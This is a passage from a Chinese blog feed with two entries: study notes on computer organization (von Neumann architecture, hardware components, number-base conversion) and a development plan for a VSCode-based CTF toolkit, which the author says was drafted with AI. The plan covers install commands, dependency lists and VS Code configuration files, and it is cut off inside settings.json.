        <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><h2 id="第一章-计算机系统概述"><a href="#第一章-计算机系统概述" class="headerlink" title="第一章 计算机系统概述"></a>第一章 计算机系统概述</h2><h3 id="1-1-计算机的基本概念"><a href="#1-1-计算机的基本概念" class="headerlink" title="1.1 计算机的基本概念"></a>1.1 计算机的基本概念</h3><p><strong>电子计算机</strong> 是一种可以 <strong>存储程序</strong>，并且通过 <strong>执行程序指令</strong>，可以自动，高速，精确地对数字信息进行各种 <strong>复杂处理</strong>，然后 <strong>输出运算结果</strong> 的高科技 <strong>智能</strong> 电子设备。</p><p>5 个逻辑模块：输入设备、存储器、输出设备、运算器、控制器。</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/lt99DP.png" alt=""></p><p>（如今运算器和控制器已集成在 CPU 中）</p><h4 id="1-1-1-信息的数字化表示"><a href="#1-1-1-信息的数字化表示" class="headerlink" title="1.1.1 信息的数字化表示"></a>1.1.1 信息的数字化表示</h4><ol><li>在计算机中用数字代码（二进制代码）表示各种信息。</li><li>在物理机制上用数字信号（数字型电信号）表示数字代码。</li><li>信息数字化表示的优点：<ul><li>物理上易实现信息的表示与存储。</li><li>抗干扰能力强，可靠性高。</li><li>数值表示范围大，精度高。</li><li>可表示的信息类型广泛。</li><li>能用数字逻辑技术进行处理。</li></ul></li></ol><h4 id="1-1-2-存储程序工作方式"><a href="#1-1-2-存储程序工作方式" class="headerlink" title="1.1.2 存储程序工作方式"></a>1.1.2 存储程序工作方式</h4><ol><li>编制程序。</li><li>存储程序。</li><li>自动，连续执行程序。</li><li>输出结果。</li></ol><p>计算机的工作流程：编写程序→输入程序→存储程序→转换为指令序列→执行指令→输出结果。</p><h4 id="1-1-3-计算机的分类"><a href="#1-1-3-计算机的分类" class="headerlink" title="1.1.3 计算机的分类"></a>1.1.3 计算机的分类</h4><p>计算机从总体上来说分为两大类：<strong>模拟计算机</strong> 和 <strong>数字计算机</strong>。</p><p>特点：</p><ul><li>模拟计算机：由模拟运算器件构成，处理在实践和数值上连续的模拟量（如：电压，电流等）。</li><li>数字计算机：由数字逻辑器件构成，处理离散的数字量。</li></ul><p>其中数字计算机又可分为 <strong>专用计算机</strong> 和 <strong>通用计算机</strong>。</p><p>按照系统规模和计算能力，也可以分为：巨型机（超算），大型机，小型机，微型机等，随着超大规模集成电路技术的不断发展，类型的划分会动态变化。</p><h3 id="1-2-计算机的诞生和发展"><a href="#1-2-计算机的诞生和发展" class="headerlink" title="1.2 计算机的诞生和发展"></a>1.2 计算机的诞生和发展</h3><p>计算机之父 – 冯・诺依曼。</p><p>EDVAC（冯・诺依曼思想）。</p><p>第一台严格意义上的电子计算机（ENIAC，宾夕法尼亚大学，1946.2）。</p><h4 id="1-2-1-冯・诺依曼体系"><a href="#1-2-1-冯・诺依曼体系" class="headerlink" title="1.2.1 冯・诺依曼体系"></a>1.2.1 冯・诺依曼体系</h4><ol><li>用二进制代码表示程序和数据；任何复杂运算和操作都转换成二进制代码表示的指令，数据也用二进制代码来表示。</li><li>采用存储程序的工作方式；将程序和数据存储起来（存储程序），让计算机自动地执行指令，完成各种复杂的运算操作（核心思想）。</li><li>新型的现代计算机硬件组成；存储器，运算器，控制器，输入设备和输出设备。奠定了现代电子计算机的理论基础。</li></ol><h4 id="1-2-2-计算机的发展历程"><a href="#1-2-2-计算机的发展历程" class="headerlink" title="1.2.2 计算机的发展历程"></a>1.2.2 计算机的发展历程</h4><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/ltA8PK.png" alt=""></p><h4 id="1-2-3-未来的发展趋势"><a href="#1-2-3-未来的发展趋势" class="headerlink" title="1.2.3 未来的发展趋势"></a>1.2.3 未来的发展趋势</h4><ol><li>向巨型化方向。</li><li>向微型化方向。</li><li>向多媒体化方向。</li><li>向网络化方向。</li><li>向智能化方向。</li></ol><h3 id="1-3-计算机系统的层次结构"><a href="#1-3-计算机系统的层次结构" class="headerlink" title="1.3 计算机系统的层次结构"></a>1.3 计算机系统的层次结构</h3><p>硬件：是指构成计算机系统的实体和装置之类的有形设备，是组成计算机系统的物质基础。</p><p>软件：是指硬件所表达的各种内在信息，包括数据与控制程序。因为它们是无形的东西，所以称为软件或软设备。</p><h4 id="1-3-1-计算机的硬件系统组成"><a href="#1-3-1-计算机的硬件系统组成" class="headerlink" title="1.3.1 计算机的硬件系统组成"></a>1.3.1 计算机的硬件系统组成</h4><ol><li>硬件系统的基本组成模型</li></ol><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/laAwtI.png" alt=""></p><p>主要功能部件：</p><ul><li><p><strong>CPU</strong> ：主要由运算器，控制器等部件组成。</p><ul><li><p><strong>运算器</strong></p><ul><li>功能：完成两类（算术和逻辑）运算。</li><li>组成特点：<ul><li>主要有 ALU（算术逻辑单元）构成，执行算术，逻辑运算以及移位循环等操作，是 CPU 功能的主要执行部件。</li><li>ALU 以全加器为核心，具有多种运算功能。</li><li>运算的位数越多，计算精度就越高，但期间也更复杂。</li><li>运算器的数据宽度一般是：8/16/32/64 位。</li></ul></li></ul></li><li><p><strong>控制器</strong></p><ul><li>功能：产生控制命令（微命令），控制全机操作。</li><li>基本组成：<img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/laEWrD.png" alt=""></li></ul></li></ul></li><li><p><strong>存储器</strong> ：存储数据和数字化后的程序。</p><ul><li>存储单元。</li><li>地址。</li><li>存储容量。</li><li>内存储器（主存）。</li><li>外存储器（辅存）。</li></ul></li><li><p><strong>输入输出设备</strong> 。</p></li><li><p><strong>总线</strong> ：能为多个部件分时共享的一组信息传送通路。</p><ul><li>数据总线。</li><li>地址总线。</li><li>控制总线。</li></ul></li><li><p><strong>接口</strong> ：具有缓冲，转换，连接的功能的部件。</p></li></ul><ol><li>计算机硬件的典型架构<ul><li><strong>微型计算机</strong> ：南 - 北桥架构</li></ul></li></ol><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/3ixYod.png" alt=""></p><pre><code> * **小型计算机** ：多处理器架构</code></pre><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/3ixDOS.png" alt=""></p><pre><code> * **超级计算机（超算）** ：集群式架构。 * **多处理机系统结构** ：用多处理器 CPU 构成。根据处理器之间连接的紧密程度，又分为：①紧密耦合型多机系统 ②松散耦合型多机系统。</code></pre><h4 id="1-3-2-软件系统"><a href="#1-3-2-软件系统" class="headerlink" title="1.3.2 软件系统"></a>1.3.2 软件系统</h4><ol><li>软件类别：<strong>系统程序</strong> 和 <strong>应用程序</strong>。<ul><li><strong>系统程序</strong> ：负责系统调度管理，提供运行和开发环境，各种服务，确保系统运行良好。</li><li><em>**</em>应用程序 ：利用计算机来解决应用问题所编制的程序，如工程设计程序，数据处理程序，自动控制程序，企业管理程序，情报检索程序，科学计算程序等等。</li></ul></li></ol><h4 id="1-3-3-硬，软件系统层次结构"><a href="#1-3-3-硬，软件系统层次结构" class="headerlink" title="1.3.3 硬，软件系统层次结构"></a>1.3.3 硬，软件系统层次结构</h4><p>计算机系统是一个由多层次的软件和硬件组成的系统，基本结构如下图所示：</p><h4 id="1-3-4-软件和硬件的逻辑等价性"><a href="#1-3-4-软件和硬件的逻辑等价性" class="headerlink" title="1.3.4 软件和硬件的逻辑等价性"></a>1.3.4 软件和硬件的逻辑等价性</h4><ol><li>软件的特点：易于实现各种逻辑与运算功能，但是常受到速度指标和软件容量的制约。</li><li>硬件的特点：可以高速实现逻辑和运算的功能，但是难以实现复杂功能或计算，受到控制复杂性指标的制约。</li><li><strong>计算机中的软件，理论上都可以“固化”“或硬化”成硬件，以提高执行速度</strong> 。</li></ol><h3 id="1-4-计算机系统的性能指标"><a href="#1-4-计算机系统的性能指标" class="headerlink" title="1.4 计算机系统的性能指标"></a>1.4 计算机系统的性能指标</h3><ol><li><p><strong>基本字长</strong></p><ul><li>指一次数据操作的基本位数。</li><li>会影响计算的精度，指令的功能。</li></ul></li><li><p><strong>外频</strong> ：外部频率或基频，也叫系统时钟频率。</p></li><li><p>常用的 CPU 性能指标</p><ul><li>CPU 的主频 = 外频✖倍频系数。</li><li>IPS，每秒执行指令数。</li><li>CPI，每一个指令执行过程中所需的时钟周期数量。</li><li>FLOPS，每秒执行浮点运算的次数。</li><li>CPU 的功耗<ul><li>静态功耗是由于半导体电路自身的损耗造成的功耗。</li></ul></li></ul></li><li><p>数据传输率</p><ul><li>带宽 =（位宽✖工作频率）/8（B/S）</li><li>物理含义：单位时间内数据的传输量。</li><li>注意：计算 PCI - E 总线的带宽时，一般还要考虑编码方式，单双工模式和通道路数等。</li></ul></li><li><p>存储器的容量</p></li></ol><h2 id="第二章-数据的表示，运算与校验"><a href="#第二章-数据的表示，运算与校验" class="headerlink" title="第二章 数据的表示，运算与校验"></a>第二章 数据的表示，运算与校验</h2><h3 id="2-1-数值及其相互转换"><a href="#2-1-数值及其相互转换" class="headerlink" title="2.1 数值及其相互转换"></a>2.1 数值及其相互转换</h3><h4 id="2-1-1-进位计数制"><a href="#2-1-1-进位计数制" class="headerlink" title="2.1.1 进位计数制"></a>2.1.1 进位计数制</h4><ol><li><p>数值的基与权</p><ul><li>在任一数制中，每一数位上允许使用的计数符号的个数被称为该数制的 <strong>基数</strong> 。</li><li>每 1 位都对应 1 个表示该位在数码中的位置的值，这个值就称为数位的 <strong>权值</strong> w。</li><li>常用进位制：2 进制，8 进制，16 进制。</li></ul></li><li><p>进制之间的转换</p><ul><li><p>十进制转换为 R 进制：</p><ul><li>整数部分：除 R 取余法。</li><li>小数部分：乘 R 取整法。</li><li>例：将十进制数 43 转换为二进制、八进制、十六进制。<ul><li>二进制：101011。</li><li>八进制：53。</li><li>十六进制：2B。</li></ul></li></ul></li><li><p>R 进制转换为十进制：</p><ul><li>按权展开求和。</li><li>例：二进制数 101011 转换为十进制数：43。</li></ul></li><li>二进制与八进制、十六进制的转换：<ul><li>二进制转换为八进制：从右往左，每三位二进制数转换为一位八进制数。</li><li>二进制转换为十六进制：从右往左，每四位二进制数转换为一位十六进制数。</li><li>例：二进制数 101011 转换为八进制数：53，转换为十六进制数：2B。</li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于VSCode的CTF工具开发方案</title>
      <link href="/posts/cc9c528.html"/>
      <url>/posts/cc9c528.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前有想过开发一个CTF万能工具，奈何只有我一个人来开发的话，开发工作量会非常大。突然奇想用AI来设计开发方案，（看个乐呵，万一以后complete it）<br>github上面有一个项目，说是集成了所有的CTF工具：<a href="https://github.com/RemusDBD/ctftools-all-in-one">ctftools-all-in-one</a><br>方案参与AI：Kimi（开发思路）———&gt; 扣子空间（具体实现方案）———&gt; deepseek（完善方案）</p></blockquote><h1 id="基于VSCode的CTF工具开发方案"><a href="#基于VSCode的CTF工具开发方案" class="headerlink" title="基于VSCode的CTF工具开发方案"></a>基于VSCode的CTF工具开发方案</h1><h2 id="一、开发流程概述"><a href="#一、开发流程概述" class="headerlink" title="一、开发流程概述"></a>一、开发流程概述</h2><p>基于VSCode的CTF工具开发流程分为6个核心阶段，从环境搭建到最终部署形成完整闭环，各阶段关键节点及产出物如下：</p><ol><li><strong>环境准备阶段</strong>：安装VSCode及必要扩展、系统工具链和依赖包</li><li><strong>项目初始化阶段</strong>：创建项目结构、配置调试环境和构建任务</li><li><strong>核心框架开发阶段</strong>：实现插件接口、插件管理器和Python交互层</li><li><strong>功能插件开发阶段</strong>：开发Base64工具、端口扫描等具体功能插件</li><li><strong>测试与调试阶段</strong>：单元测试、集成测试和性能优化</li><li><strong>打包发布阶段</strong>：生成VSCode扩展包并发布到市场</li></ol><h2 id="二、环境搭建详细步骤"><a href="#二、环境搭建详细步骤" class="headerlink" title="二、环境搭建详细步骤"></a>二、环境搭建详细步骤</h2><h3 id="1-VS-Code扩展安装"><a href="#1-VS-Code扩展安装" class="headerlink" title="1. VS Code扩展安装"></a>1. VS Code扩展安装</h3><p>通过命令行执行以下命令安装所有必要扩展：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># C#语言支持和调试</span></span><br><span class="line">code --install-extension ms-dotnettools.csharp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python语言支持</span></span><br><span class="line">code --install-extension ms-python.python</span><br><span class="line"></span><br><span class="line"><span class="comment"># NuGet包管理</span></span><br><span class="line">code --install-extension jmrog.vscode-nuget-package-manager</span><br><span class="line"></span><br><span class="line"><span class="comment"># C/C++构建支持</span></span><br><span class="line">code --install-extension ms-vscode.cmake-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终端集成增强</span></span><br><span class="line">code --install-extension formulahendry.terminal</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSON格式化和预览</span></span><br><span class="line">code --install-extension techer.open-in-browser</span><br></pre></td></tr></table></figure><h3 id="2-系统工具安装"><a href="#2-系统工具安装" class="headerlink" title="2. 系统工具安装"></a>2. 系统工具安装</h3><p><strong>Windows系统</strong>通过winget包管理器安装（需以管理员身份运行PowerShell）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .NET 7 SDK (7.0.x)</span></span><br><span class="line">winget install Microsoft.DotNet.SDK.<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows SDK (10.0.19041.0+)</span></span><br><span class="line">winget install Microsoft.WindowsSDK <span class="literal">--version</span> <span class="number">10.0</span>.<span class="number">19041.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.11.x</span></span><br><span class="line">winget install Python.Python.<span class="number">3.11</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Git版本控制</span></span><br><span class="line">winget install Git.Git</span><br><span class="line"></span><br><span class="line"><span class="comment"># VS Code最新版</span></span><br><span class="line">winget install Microsoft.VisualStudioCode</span><br></pre></td></tr></table></figure><h3 id="3-依赖包安装"><a href="#3-依赖包安装" class="headerlink" title="3. 依赖包安装"></a>3. 依赖包安装</h3><p><strong>项目依赖包</strong>通过NuGet和pip安装：</p><h4 id="NET-NuGet包安装"><a href="#NET-NuGet包安装" class="headerlink" title=".NET NuGet包安装"></a>.NET NuGet包安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># WinUI 3控件库</span></span><br><span class="line">dotnet add package Microsoft.UI.Xaml --version 2.8.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python与.NET互操作</span></span><br><span class="line">dotnet add package Python.Runtime --version 3.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSON处理</span></span><br><span class="line">dotnet add package Newtonsoft.Json --version 13.0.3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows SDK构建工具</span></span><br><span class="line">dotnet add package Microsoft.Windows.SDK.BuildTools --version 10.0.22621.756</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows应用SDK</span></span><br><span class="line">dotnet add package WindowsAppSDK --version 1.4.231008000</span><br></pre></td></tr></table></figure><h4 id="Python库安装"><a href="#Python库安装" class="headerlink" title="Python库安装"></a>Python库安装</h4><p>创建<code>requirements.txt</code>文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwntools==4.9.0</span><br><span class="line">angr==9.2.52</span><br><span class="line">frida-tools==12.1.3</span><br><span class="line">unicorn==2.0.1.post1</span><br><span class="line">capstone==5.0.1</span><br><span class="line">keystone-engine==0.9.2</span><br><span class="line">numpy==1.24.2</span><br><span class="line">onnxruntime==1.14.1</span><br><span class="line">pythonnet==3.0.1</span><br></pre></td></tr></table></figure><p>执行安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="三、项目结构与配置"><a href="#三、项目结构与配置" class="headerlink" title="三、项目结构与配置"></a>三、项目结构与配置</h2><h3 id="1-完整项目目录结构"><a href="#1-完整项目目录结构" class="headerlink" title="1. 完整项目目录结构"></a>1. 完整项目目录结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">CTFTool/</span><br><span class="line">├── .vscode/                  # VS Code配置</span><br><span class="line">│   ├── launch.json           # 调试配置</span><br><span class="line">│   ├── tasks.json            # 构建任务</span><br><span class="line">│   └── settings.json         # 工作区设置</span><br><span class="line">├── Assets/                   # 资源文件</span><br><span class="line">│   ├── Icons/                # 图标资源</span><br><span class="line">│   └── Python/               # 嵌入式Python环境</span><br><span class="line">├── Interfaces/               # 接口定义</span><br><span class="line">│   └── IPlugin.cs            # 插件接口</span><br><span class="line">├── PluginSystem/             # 插件系统</span><br><span class="line">│   ├── PluginLoader.cs       # 插件加载器</span><br><span class="line">│   ├── PluginManager.cs      # 插件管理器</span><br><span class="line">│   └── PythonPluginWrapper.cs # Python插件包装器</span><br><span class="line">├── Plugins/                  # 插件目录</span><br><span class="line">│   ├── Base64Tool/           # Base64工具插件</span><br><span class="line">│   ├── PortScanner/          # 端口扫描插件</span><br><span class="line">│   └── ReverseHelper/        # 逆向辅助插件</span><br><span class="line">├── CTFTool.csproj            # 项目文件</span><br><span class="line">├── App.xaml                  # 应用入口XAML</span><br><span class="line">├── App.xaml.cs               # 应用入口代码</span><br><span class="line">├── MainWindow.xaml           # 主窗口XAML</span><br><span class="line">├── MainWindow.xaml.cs        # 主窗口代码</span><br><span class="line">├── requirements.txt          # Python依赖列表</span><br><span class="line">└── Install-PythonDependencies.ps1 # Python依赖安装脚本</span><br></pre></td></tr></table></figure><h3 id="2-VS-Code配置文件详解"><a href="#2-VS-Code配置文件详解" class="headerlink" title="2. VS Code配置文件详解"></a>2. VS Code配置文件详解</h3><h4 id="launch-json（调试配置）"><a href="#launch-json（调试配置）" class="headerlink" title="launch.json（调试配置）"></a>launch.json（调试配置）</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.NET Core Launch (CTF Tool)&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;coreclr&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/bin/Debug/net6.0-windows10.0.19041.0/CTFTool.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;internalConsole&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;justMyCode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="tasks-json（构建任务）"><a href="#tasks-json（构建任务）" class="headerlink" title="tasks.json（构建任务）"></a>tasks.json（构建任务）</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dotnet&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/CTFTool.csproj&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;Debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-v&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;m&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$msCompile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dotnet&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/CTFTool.csproj&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;Release&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-p:GenerateAppxPackage=true&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$msCompile&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;install-python-deps&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;powershell -ExecutionPolicy Bypass -File ./Install-PythonDependencies.ps1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="settings-json（工作区设置）"><a href="#settings-json（工作区设置）" class="headerlink" title="settings.json（工作区设置）"></a>settings.json（工作区设置）</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;files.exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;**/.git&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.svn&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.hg&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/CVS&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span 